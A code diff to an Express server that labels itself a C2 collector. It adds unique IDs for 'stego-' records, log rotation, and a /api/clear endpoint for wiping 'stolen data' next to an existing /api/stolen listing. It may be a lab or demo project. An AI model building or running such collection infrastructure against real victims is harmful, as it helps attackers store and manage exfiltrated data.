@@ -85,7 +85,7 @@ app.post('/collect', collectLimiter, async (req, res) => {
   console.log(`[C2]   Source: ${safeSource}`)
 
   const record = {
-    id: `stego-${Date.now()}`,
+    id: `stego-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
     timestamp: ts,
     ip: req.ip || req.connection.remoteAddress,
     userAgent: sanitizeField(req.get('user-agent')),
@@ -99,10 +99,20 @@ app.post('/collect', collectLimiter, async (req, res) => {
     JSON.stringify(record, null, 2)
   )
 
-  // Append to master log
+  // Append to master log (with rotation)
   try {
+    const logPath = path.join(DATA_DIR, 'master-log.jsonl');
+    
+    // Check log size and rotate if > 5MB
+    try {
+      const stats = await fs.stat(logPath);
+      if (stats.size > 5 * 1024 * 1024) {
+        await fs.rename(logPath, logPath + '.bak');
+      }
+    } catch (e) { /* ignore if new file */ }
+
     await fs.appendFile(
-      path.join(DATA_DIR, 'master-log.jsonl'),
+      logPath,
       JSON.stringify(record) + '\n'
     )
   } catch (e) { /* ignore */ }
@@ -157,6 +167,32 @@ app.get('/api/stolen', apiLimiter, async (req, res) => {
     res.json({ success: true, count: records.length, records })
   } catch (e) {
     res.json({ success: true, count: 0, records: [] })
+  }
+})
+
+// ──────────────────────────────────────────────────
+// POST /api/clear — clears all stolen data
+// ──────────────────────────────────────────────────
+app.post('/api/clear', apiLimiter, async (req, res) => {
+  await ensureDataDir()
+  try {
+    const files = await fs.readdir(DATA_DIR)
+    const jsonFiles = files.filter(f => f.endsWith('.json') && f !== 'master-log.jsonl')
+
+    // Delete individual JSON records
+    for (const file of jsonFiles) {
+      await fs.unlink(path.join(DATA_DIR, file))
+    }
+
+    // Clear master log
+    try {
+      await fs.writeFile(path.join(DATA_DIR, 'master-log.jsonl'), '')
+    } catch (e) { /* ignore if not exists */ }
+
+    res.json({ success: true, message: 'All data cleared' })
+  } catch (e) {
+    console.error('Clear error:', e)
+    res.status(500).json({ success: false, error: 'Failed to clear data' })
   }
 })
 
